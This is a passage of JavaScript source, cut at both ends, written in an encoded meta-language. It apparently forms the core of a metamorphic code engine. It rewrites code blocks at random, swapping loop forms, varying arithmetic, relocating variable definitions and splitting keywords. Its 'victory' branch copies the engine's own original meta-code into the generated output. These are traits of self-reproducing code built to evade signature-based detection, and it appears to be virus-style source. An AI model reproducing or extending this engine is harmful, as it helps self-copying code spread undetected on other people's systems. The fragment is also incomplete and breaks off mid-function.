                MetaLevelLanguage+='__(CBC800|CBC700)c+s(°+CBCRString+°,#x1fGiveMeString(#n41n#)1x#)';
                MetaLevelLanguage+='__(CBC900|CBC800)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC110|CBC900)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC210|CBC110)c+s(°+CBCRString+°,#x1fGiveMeString(#n99n#)1x#)';
                MetaLevelLanguage+='__(CBC220|CBC210)c+s(°+CBCRString+°,#x1#""ase ""#1x#)';
                MetaLevelLanguage+='__(CBC230|CBC200,CBC220)c+s(°+CBCRString+°,#x1°+CBCifargument2+°1x#)';
                MetaLevelLanguage+='__(CBC240|CBC230)c+s(°+CBCRString+°,#x1fGiveMeString(#n58n#)1x#)';
                MetaLevelLanguage+='__(CBC250|CBC240)c+s(°+CBCRString+°,#x1fGiveMeString(#n33n#)1x#)';
                MetaLevelLanguage+='__(CBC260|CBC250)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC270|CBC260)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC280|CBC270)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';
                MetaLevelLanguage+='__(CBC290|CBC280)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC300|CBC290)c+s(°+CBCRString+°,#x1fGiveMeString(#n98n#)1x#)';
                MetaLevelLanguage+='__(CBC310|CBC300)c+s(°+CBCRString+°,#x1#""reak""#1x#)';
                MetaLevelLanguage+='__(CBC320|CBC310)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC330|CBC320)c+s(°+CBCRString+°,#x1fGiveMeString(#n33n#)1x#)';
                MetaLevelLanguage+='__(CBC340|CBC330)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC350|CBC340)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';
                MetaLevelLanguage+='__(CBC360|CBC350,CBC400)c+s(°+CBCRString+°,#x1°+CBCifdefcode+°1x#)';
                MetaLevelLanguage+='__(CBC370|CBC360)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC380|CBC370)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';                                                                                                                                                                                                                                                                                                        
            MetaLevelLanguage+='__(CBC0700|)021';            
                MetaLevelLanguage+='__(CBCe100|)var CBCelsecodeinclude=#x1#""""#1x#';                
                MetaLevelLanguage+='__(CBCe200|CBCe100)if(#x1#O1°+CBCifAntiCode+°#.length1O#1x#!#x2#n0n#2x#?>)007';
                    MetaLevelLanguage+='__(CBCe100|)c+s(°+CBCelsecodeinclude+°,#x1#""els""#1x#)';
                    MetaLevelLanguage+='__(CBCe200|CBCe100)c+s(°+CBCelsecodeinclude+°,#x1#""e""#1x#)';
                    MetaLevelLanguage+='__(CBCe300|CBCe200)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n64n#)1x#)';
                    MetaLevelLanguage+='__(CBCe400|CBCe300)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n123n#)1x#)'; 
                    MetaLevelLanguage+='__(CBCe500|CBCe400)c+s(°+CBCelsecodeinclude+°,#x1fCreateBlockOfCode(#x2°+CBCifAntiCode+°2x#)1x#)';  
                    MetaLevelLanguage+='__(CBCe600|CBCe500)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n64n#)1x#)';  
                    MetaLevelLanguage+='__(CBCe700|CBCe600)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n125n#)1x#)';                                                                                  
                MetaLevelLanguage+='__(CBCe300|)000';       
                MetaLevelLanguage+='__(CBCe400|)var CBCtmpLL=#x1fCreateLogic(#x2°+CBCcondition+°2x#)1x#';
                MetaLevelLanguage+='__(CBCe500|CBCe400)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBCe600|CBCe500)c+s(°+CBCRString+°,#x1#""if(""#1x#)';
                MetaLevelLanguage+='__(CBCe700|CBCe600)c+s(°+CBCRString+°,#x1°+CBCtmpLL+°1x#)';
                MetaLevelLanguage+='__(CBCe800|CBCe700)c+s(°+CBCRString+°,#x1#"")""#1x#)';
                MetaLevelLanguage+='__(CBCe900|CBCe800)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBCe105|CBCe900)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBCe110|CBCe105)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';   
                MetaLevelLanguage+='__(CBCe120|CBCe110)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';   
                MetaLevelLanguage+='__(CBCe130|CBCe120)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';   
                MetaLevelLanguage+='__(CBCe140|CBCe200,CBCe130)c+s(°+CBCRString+°,#x1°+CBCelsecodeinclude+°1x#)';                                                                                                                                                    
            MetaLevelLanguage+='__(CBC0800|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1°+CBCNumOfElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBC0900|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1°+NumOfElementsAntiCode+°1x#)';
            MetaLevelLanguage+='__(CBC1000|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1#n2n#1x#)';
        MetaLevelLanguage+='__(CBCB060|)000';        
        MetaLevelLanguage+='__(CBCB070|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n5n#)1O#1x#!#x2#x3#""wh""#3x#+#x4#""ile""#4x#2x#?==)047';
            MetaLevelLanguage+='__(CBC0100|)var CBCwhinitial=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n40n#)4x#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#x6fGiveMeString(#n36n#)6x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0200|)var CBCwhcondition=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x5fGiveMeString(#n36n#)5x#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n64n#)4x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0300|)var CBCwhaction=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n64n#)4x#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#x5fGiveMeString(#n41n#)5x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0400|)var CBCwhNumOfElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.lastIndexOf(#x4fGiveMeString(#n41n#)4x#)3x#+#n1n#)1O#2x#,#n10n#)1x#'; 
            MetaLevelLanguage+='__(CBC0500|CBC0400)var CBCwhExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2#x3°+CBCCodeLineIndex+°3x# +#n1n#2x#,#x4#x5°+CBCCodeLineIndex+°5x# + #x6°+CBCwhNumOfElementsCode+°6x# +#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0600|)var CBCwhRNum2=#x1fGiveRandomNumber(#x2#n2n#2x#)1x#';
            MetaLevelLanguage+='__(CBC0700|)c+1(°+sNoDerivation1+°)';
            MetaLevelLanguage+='__(CBC0800|CBC0200,CBC0700)var CBCwhRLogic=#x1fCreateLogic(#x2°+CBCwhcondition+°2x#)1x#';
            MetaLevelLanguage+='__(CBC0900|CBC0800)ysNoDerivation1=#x1#n0n#1x#';
            MetaLevelLanguage+='__(CBC1000|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n0n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)if(#x1#O1°+CBCwhinitial+°#.length1O#1x#!#x2#n0n#2x#?>)002';
                    MetaLevelLanguage+='__(CBC0100|CBC0110)yCBCLocalVarName.push(#x1#O1°+CBCwhinitial+°#.substring(#n4n#,#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(#n61n#)3x#)2x#)1O#1x#)';                    
                    MetaLevelLanguage+='__(CBC0200|)yCBCLocalVarDefs.push(#x1#O1°+CBCwhinitial+°#.substring(#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(61)3x#)+#n1n#2x#)1O#1x#)';
                MetaLevelLanguage+='__(CBC0200|)000';
                MetaLevelLanguage+='__(CBC0300|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#""while(""#1x#)';
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1#"")""#1x#)';                            
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCwhExecuteCode+°2x#)1x#)';                                               
                MetaLevelLanguage+='__(CBC1000|CBC0900)if(#x1#O1°+CBCwhaction+°#.length1O#1x#!#x2#n0n#2x#?>)001';                
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCwhaction+°2x#,#x3#n1n#3x#)1x#)';
                MetaLevelLanguage+='__(CBC1100|)000';
                MetaLevelLanguage+='__(CBC1200|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1100|)000';
            MetaLevelLanguage+='__(CBC1200|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n1n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)ysNoDerivation1=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCRString+°,#x1#""fo""#1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#""r(""#1x#)';                
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhinitial+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1°+CBCwhaction+°1x#)';   
                MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1fGiveMeString(#n41n#)1x#)';                                                                                                                                 
                MetaLevelLanguage+='__(CBC1100|CBC1000)ysNoDerivation1=#x1#n0n#1x#';
                MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC1400|CBC1300)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(°+CBCwhExecuteCode+°)1x#)';   
                MetaLevelLanguage+='__(CBC1500|CBC1400)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1600|CBC1500)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1300|)000';
            MetaLevelLanguage+='__(CBC1400|CBC1000,CBC1200)c+n(°+CBCCodeLineIndex+°,#x1°+CBCwhNumOfElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBC1500|CBC1000,CBC1200)c+1(°+CBCCodeLineIndex+°)';            
        MetaLevelLanguage+='__(CBCB080|)000';                   
        MetaLevelLanguage+='__(CBCB081|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#""c""#2x#?==)042';        
            MetaLevelLanguage+='__(CBC0100|)var CBCcCalcCode=#x1#""""#1x#';
            MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1#O1°+CBCSingleElement+°#.substring(#n2n#,#n3n#)1O#1x#!#x2#""1""#2x#?==)007';            
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#"")""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0300|CBC0100)if(#x1fGiveRandomNumber(#n3n#)1x#!#n0n#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1°+CBCVariable1+°1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';                                         
                MetaLevelLanguage+='__(CBC0400|)000';
            MetaLevelLanguage+='__(CBC0300|)002';
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#"",""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"",""#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#"")""#)3x#)1O#1x#';                
            MetaLevelLanguage+='__(CBC0400|)ysDeriveRestrString=#x1#""""#1x#';            
            MetaLevelLanguage+='__(CBC0500|CBC0200,CBC0400)if(#x1°+CBCcCalcCode+°1x#!#x2#""""#2x#?==)019';
                MetaLevelLanguage+='__(CBC0100|)var CBCcWhichCalc=#x1fGiveRandomNumber(#n2n#)1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCcWhichCalc+°1x#!#x2#n0n#2x#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)+fGiveMeString(#n61n#)1x#)';                               
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n20n#3x#)1x#)';                                          
                MetaLevelLanguage+='__(CBC0300|)013';
                    MetaLevelLanguage+='__(CBC0100|)var CBCSomeLog=#x1(#x2#O1°+CBCSingleElement+°#.substring(2,3)1O#==#""n""#2x#&&#x3fGiveRandomNumber(#n2n#)3x#)1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCSomeLog+°1x#!#x2#n0n#2x#?!=)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#""=""#1x#)';
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';                      
                    MetaLevelLanguage+='__(CBC0300|)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#""=""#1x#)';  
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';                                                                                                                                            
            MetaLevelLanguage+='__(CBC0600|)000';            
            MetaLevelLanguage+='__(CBC0700|)var PMOperator=#x1#O1°+CBCSingleElement+°#.substring(#n1n#,#n2n#)1O#1x#';
            MetaLevelLanguage+='__(CBC0800|CBC0500,CBC0700)while($#x1#O1°+CBCcCalcCode+°#.indexOf(#x2fGiveMeString(#n64n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
                MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1#O1°+CBCcCalcCode+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3°+PMOperator+°3x#)1O#1x#';    
            MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
            MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1°+CBCcCalcCode+°1x#)';
            MetaLevelLanguage+='__(CBC1100|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                         
            MetaLevelLanguage+='__(CBC1500|CBC1200)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB082|)000';                 
          MetaLevelLanguage+='__(CBCB100|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#""x""#2x#?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var xxExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+xxExecuteableCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB110|)000';                      
        MetaLevelLanguage+='__(CBCB200|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!""y""?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var yyExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(°+yyExecuteableCode+°,1)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';   
        MetaLevelLanguage+='__(CBCB210|)000';                         
        MetaLevelLanguage+='__(CBCB300|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n3n#)1O#1x#!#x2#""def""#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2#O1°+CBCSingleElement+°#.substring(4)1O#2x#,#x3#n0n#3x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                          
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB310|)000';  
        MetaLevelLanguage+='__(CBCB400|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n4n#)1O#1x#!#x2#""var ""#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCSingleElement+°2x#,#n1n#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                             
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';  
        MetaLevelLanguage+='__(CBCB410|)000';
        MetaLevelLanguage+='__(CBCB620|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n7n#)1O#1x#!#x2#""victory""#2x#?==)011'; 
            MetaLevelLanguage+='__(CBCC100|)if(#x1fGiveRandomNumber(#n2n#)1x#!#n0n#?>)002';
                MetaLevelLanguage+='__(CBCD100|)c+s(°+CBCRString+°,#x1#""va""#1x#)';
                MetaLevelLanguage+='__(CBCD200|CBCD100)c+s(°+CBCRString+°,#x1#""r ""#1x#)';                              
            MetaLevelLanguage+='__(CBCC101|)000';
            MetaLevelLanguage+='__(CBCC111|)xDoIWriteMetaCode=#n1n#';                 
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1#O1°+CBCSingleElement+°.substring(#n8n#)1O#1x#)';                                               
            MetaLevelLanguage+='__(CBCC250|CBCC111,CBCC200)c+s(°+CBCRString+°,#x1fCreateString(#x2°+OriginalMetaCode+°2x#)1x#)';    
            MetaLevelLanguage+='__(CBCC300|CBCC250)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';     
            MetaLevelLanguage+='__(CBCC710|CBCC250)xDoIWriteMetaCode=#n0n#';                                        
        MetaLevelLanguage+='__(CBCB630|)000';          
        MetaLevelLanguage+='__(CBCB500|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n9n#)1O#1x#!#x2#""function ""#2x#?==)009';    
            MetaLevelLanguage+='__(CBCC100|)var CBCfunctionname=#x1#O1°+CBCSingleElement+°#.substring(#n9n#,#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|)var CBCfunctionarguments=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#,#x4#x5°+CBCSingleElement+°.indexOf(#x6fGiveMeString(#n41n#)6x#)5x#+#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC300|)var CBCNumOfFFElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.indexOf("")"")+#n1n#3x#)1O#2x#,#x4#n10n#4x#)1x#';
            MetaLevelLanguage+='__(CBCC400|CBCC300)var CBCExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2°+CBCCodeLineIndex+° +#n1n#2x#,#x3#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfFFElementsCode+°5x# +#n1n#3x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC500|CBCC400)ysFunctionDefs.push(#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC600|CBCC200,CBCC500)ysFunctionArgs.push(#x1°+CBCfunctionarguments+°1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC100,CBCC500)ysFunctionNames.push(#x1°+CBCfunctionname+°1x#)';          
            MetaLevelLanguage+='__(CBCC800|CBCC400)c+n(°+CBCCodeLineIndex+°,#x1°+CBCNumOfFFElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBCC900|CBCC400)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB510|)000';
    MetaLevelLanguage+='__(CBC0700|CBC0600)c-1(sHierarchyOfCalls)';
    MetaLevelLanguage+='__(CBC0800|CBC0600)yCBCLocalVarName.reverse()';
    MetaLevelLanguage+='__(CBC0900|CBC0600)yCBCLocalVarDefs.reverse()';
    MetaLevelLanguage+='__(CBC1000|CBC0800,CBC0900)while($#x1°+CBCLocalVarName+°.length1x#!#x2#n0n#2x#?>@)007'
        MetaLevelLanguage+='__(CBC0100|)var CBCFirstPos=#x1#O1°+CBCRString+°#.indexOf(#x2°+CBCLocalVarName+°[#n0n#]2x#)1O#1x#';
        MetaLevelLanguage+='__(CBC0200|CBC0100)var CBCPotentialPos=#x1fFindPositionForCode(#x2°+CBCRString+°2x#,#x3°+CBCFirstPos+°3x#)1x#';
        MetaLevelLanguage+='__(CBC0300|)var CodeVarIntegrate=#x1#x2#""var ""#2x#+ #x3°+CBCLocalVarName+°[#n0n#]3x# +#x4#""=""#4x#+ #x5°+CBCLocalVarDefs+°[#n0n#]5x#+#x6fGiveMeString(#n64n#)6x#+#x7fGiveMeString(#n59n#)7x#1x#';
        MetaLevelLanguage+='__(CBC0400|CBC0300)yCBCLocalVarName.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0500|CBC0300)yCBCLocalVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0600|CBC0200)var NewVarPos=#x1°+CBCPotentialPos+°[#x2fGiveRandomNumber(#x3#O1°+CBCPotentialPos+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CBC0700|CBC0300,CBC0400,CBC0500,CBC0600)y°+CBCRString+°=#x1#x2#O1°+CBCRString+°#.substring(0,°+NewVarPos+°)1O#2x#+ #x3°+CodeVarIntegrate+°3x# + #x4°+CBCRString+°.substring(#x5°+NewVarPos+°5x#)4x#1x#';
    MetaLevelLanguage+='__(CBC1100|CBC0700,CBC1000)if(#x1sHierarchyOfCalls1x#!#x2#n0n#2x#?!=)004'
        MetaLevelLanguage+='__(CBC0100|)while($#x1#O1°+CBCRString+°#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)001'
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,fGiveMeString(#n59n#))1O#1x#'
        MetaLevelLanguage+='__(CBC0200|CBC0100)while($#x1#O1°+CBCRString+°#.indexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3#""""#3x#)1O#1x#'
    MetaLevelLanguage+='__(CBC1200|)000';            
    MetaLevelLanguage+='__(CBC1300|CBC1100)xreturn(#x1°+CBCRString+°1x#)';
    

MetaLevelLanguage+='__(2100|)function fCalculateFirstAppearance(CFAOriginalCode,CFAObjectName)011';
    MetaLevelLanguage+='__(CFA010|)var CFAObjectPlace=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2°+CFAObjectName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA020|CFA010)if(#x1°+CFAObjectPlace+°1x#!#x2#n-1n#2x#?==)007';
        MetaLevelLanguage+='__(CFAx10|)var CFAGetFunctionN=#x1#n-1n#1x#';
